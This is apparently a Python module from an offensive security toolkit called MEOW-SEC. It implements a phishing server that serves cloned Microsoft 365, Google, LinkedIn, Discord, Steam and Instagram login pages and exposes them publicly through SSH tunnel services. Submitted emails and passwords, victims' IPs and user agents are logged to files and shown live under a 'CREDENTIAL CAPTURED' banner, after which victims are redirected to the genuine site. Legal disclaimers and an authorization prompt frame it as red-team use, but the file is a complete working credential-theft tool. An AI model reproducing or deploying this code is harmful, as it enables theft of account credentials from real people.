# -*- coding: utf-8 -*-
"""
MEOW-SEC :: PHISH — Phishing Page + Tunnel (no port forwarding needed)
  · Templates : Microsoft 365, Google, LinkedIn, Generic, Custom HTML
  · Tunnel via serveo.net / localhost.run / bore.pub  (SSH, no install)
  · Capture automatique des credentials dans data/phish_*.log
  · Redirect post-capture vers la vraie page

LEGAL: Authorized red team / phishing simulations ONLY.
       Unauthorized phishing is illegal in all jurisdictions.
"""
import os, json, re, subprocess, threading, time, socket, random, string
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

from core.ui import (
                     console, show_module_banner, ok, err, info,
                     warn, find, ask_choice, G1, G2,
                     CY, OR, RD, DM)
from core.cats import cat_talk, CAT_FOUND, CAT_PWNED
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.prompt  import Prompt, Confirm
from rich.rule    import Rule
from rich         import box

# ─── TEMPLATES ───────────────────────────────────────────────
# Les HTML sont dans modules/phish_templates/*.html

_TPL_DIR = os.path.join(os.path.dirname(__file__), "phish_templates")

_TPL_META = {
    "microsoft": {"name": "Microsoft 365",  "redirect": "https://login.microsoftonline.com"},
    "google":    {"name": "Google",          "redirect": "https://accounts.google.com"},
    "linkedin":  {"name": "LinkedIn",        "redirect": "https://www.linkedin.com"},
    "discord":   {"name": "Discord",         "redirect": "https://discord.com/login"},
    "steam":     {"name": "Steam",           "redirect": "https://store.steampowered.com/login"},
    "instagram": {"name": "Instagram",       "redirect": "https://www.instagram.com/accounts/login"},
    "generic":   {"name": "Secure Portal",   "redirect": "https://example.com"},
}

def _load_tpl(key: str) -> str:
    path = os.path.join(_TPL_DIR, f"{key}.html")
    try:
        with open(path, encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        err(f"Template introuvable: {path}")
        return "<h1>Template not found</h1>"

TEMPLATES = {k: {**v, "html": _load_tpl(k)} for k, v in _TPL_META.items()}

# ─── SERVER ──────────────────────────────────────────────────

_creds_log:  list  = []
_redirect:   str   = "https://example.com"
_custom_html: str  = ""

class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # silence default access log

    def _send(self, code: int, body: str, ct: str = "text/html"):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", f"{ct}; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self._send(200, _custom_html)
        elif self.path == "/favicon.ico":
            self._send(404, "")
        else:
            self._send(200, _custom_html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode(errors="replace")
        params = parse_qs(body)
        email  = params.get("email",    [""])[0]
        passwd = params.get("password", [""])[0]
        ip     = self.client_address[0]
        ua     = self.headers.get("User-Agent","?")[:80]

        entry = {
            "time":     datetime.now().isoformat(),
            "ip":       ip,
            "email":    email,
            "password": passwd,
            "ua":       ua,
        }
        _creds_log.append(entry)
        _save_log(entry)
        find(f"[{RD}]CAPTURE[/]  [{CY}]{email}[/]  [{OR}]{passwd}[/]  from [{DM}]{ip}[/]")

        # Redirect to real site
        redir_html = f"""<!DOCTYPE html><html><head>
<meta http-equiv="refresh" content="0;url={_redirect}">
</head><body><p>Redirecting...</p></body></html>"""
        self._send(200, redir_html)

def _save_log(entry: dict):
    os.makedirs("data", exist_ok=True)
    logfile = f"data/phish_{datetime.now().strftime('%Y%m%d')}.log"
    with open(logfile, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")

# ─── TUNNEL — via core/tunnel.py ─────────────────────────────
from core.tunnel import print_tunnel_menu, start_tunnel as _start_tunnel_core

# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("phish")
    cat_talk(CAT_PWNED,
             "PHISH tunnel loaded — authorized red team use ONLY.", OR)
    console.print()

    warn("This module is for authorized phishing simulations only.")
    warn("Unauthorized phishing is ILLEGAL in all jurisdictions.")
    console.print()
    if not Confirm.ask(f"  [{OR}]I have explicit written authorization for this target[/]",
                       default=False):
        info("Aborted."); return

    console.print()

    # ── Choose template ─────────────────────────────────────────
    console.print(Rule(f"[{CY}] TEMPLATE ", style=G2))
    _tpl_keys = list(_TPL_META.keys())  # ordre du dict
    for i, k in enumerate(_tpl_keys, 1):
        console.print(f"  [{G1}][{i}][/] {_TPL_META[k]['name']}")
    custom_idx = len(_tpl_keys) + 1
    console.print(f"  [{G1}][{custom_idx}][/] Custom HTML file")
    tmpl_choice = ask_choice("Template", "1")

    global _custom_html, _redirect
    if tmpl_choice == str(custom_idx):
        path = Prompt.ask(f"  [{G1}]◈ HTML file path[/]").strip()
        if not os.path.isfile(path):
            err(f"File not found: {path}"); return
        with open(path, encoding="utf-8") as fh:
            _custom_html = fh.read()
        _redirect = Prompt.ask(f"  [{G1}]◈ Redirect URL after capture[/]",
                               default="https://example.com").strip()
    else:
        idx = int(tmpl_choice) - 1 if tmpl_choice.isdigit() else 0
        key = _tpl_keys[idx] if 0 <= idx < len(_tpl_keys) else _tpl_keys[0]
        tmpl = TEMPLATES[key]
        _custom_html = tmpl["html"]
        _redirect    = tmpl["redirect"]
        ok(f"Template: [{CY}]{tmpl['name']}[/]  → redirect: {_redirect}")

    # ── Port ────────────────────────────────────────────────────
    console.print()
    port_s = Prompt.ask(f"  [{G1}]◈ Local port[/]", default="8080").strip()
    port   = int(port_s) if port_s.isdigit() else 8080

    # ── Tunnel service ──────────────────────────────────────────
    console.print()
    console.print(Rule(f"[{CY}] TUNNEL ", style=G2))
    print_tunnel_menu()
    tunnel_choice = ask_choice("Tunnel", "1")

    # ── Start HTTP server ───────────────────────────────────────
    console.print()
    info(f"Starting phishing server on [{CY}]0.0.0.0:{port}[/]...")
    try:
        server = HTTPServer(("0.0.0.0", port), PhishHandler)
    except OSError as e:
        err(f"Cannot bind port {port}: {e}"); return

    srv_thread = threading.Thread(target=server.serve_forever, daemon=True)
    srv_thread.start()
    ok(f"Server running on port [{G1}]{port}[/]")

    # ── Start tunnel ────────────────────────────────────────────
    public_url  = ""
    tunnel_proc = None
    if tunnel_choice != "5":
        tunnel_proc, public_url = _start_tunnel_core(tunnel_choice, port)
        if public_url:
            find(f"Public URL: [{G1}]{public_url}[/]")
            console.print()
            console.print(Panel(
                f"[bold {G1}]{public_url}[/]",
                title=f"[{CY}]◈ PHISHING LINK ◈",
                border_style=RD, padding=(1,4)
            ))
        elif tunnel_choice != "5":
            warn("URL introuvable — vérifie la sortie tunnel ci-dessus.")
    if not public_url:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            local_ip = "127.0.0.1"
        public_url = f"http://{local_ip}:{port}"
        find(f"LAN URL: [{G1}]{public_url}[/]")

    # ── Live capture monitor ─────────────────────────────────────
    console.print()
    console.print(Rule(f"[{RD}] CAPTURE LOG — Ctrl+C to stop ", style=RD))
    info("Waiting for victims... Press Ctrl+C to stop.\n")

    cap_count = 0
    logfile = f"data/phish_{datetime.now().strftime('%Y%m%d')}.log"
    try:
        while True:
            time.sleep(1)
            current = len(_creds_log)
            if current > cap_count:
                for entry in _creds_log[cap_count:]:
                    t = Table(box=box.SIMPLE, show_edge=False, show_header=False, padding=(0,2))
                    t.add_column("k", style=DM, width=10)
                    t.add_column("v", style=G1)
                    t.add_row("Time",     entry["time"])
                    t.add_row("IP",       entry["ip"])
                    t.add_row("Email",    f"[bold {CY}]{entry['email']}[/]")
                    t.add_row("Password", f"[bold {RD}]{entry['password']}[/]")
                    t.add_row("UA",       entry["ua"][:60])
                    console.print(Panel(t, title=f"[{RD}]◈ CREDENTIAL CAPTURED ◈",
                                        border_style=RD))
                cap_count = current

    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        if tunnel_proc:
            tunnel_proc.terminate()

    console.print()
    ok(f"Session ended. [{G1}]{cap_count}[/] credential(s) captured.")
    if cap_count:
        ok(f"Log saved: [{CY}]{logfile}[/]")
        _show_summary()

def _show_summary():
    if not _creds_log:
        return
    console.print()
    console.print(Rule(f"[{G1}] CAPTURED CREDENTIALS ", style=G2))
    rows = [(e["time"][:19], e["ip"], e["email"], e["password"][:20])
            for e in _creds_log]
    from core.ui import print_result_table
    print_result_table("Phishing Results",
                       ["Time","IP","Email","Password (truncated)"], rows)
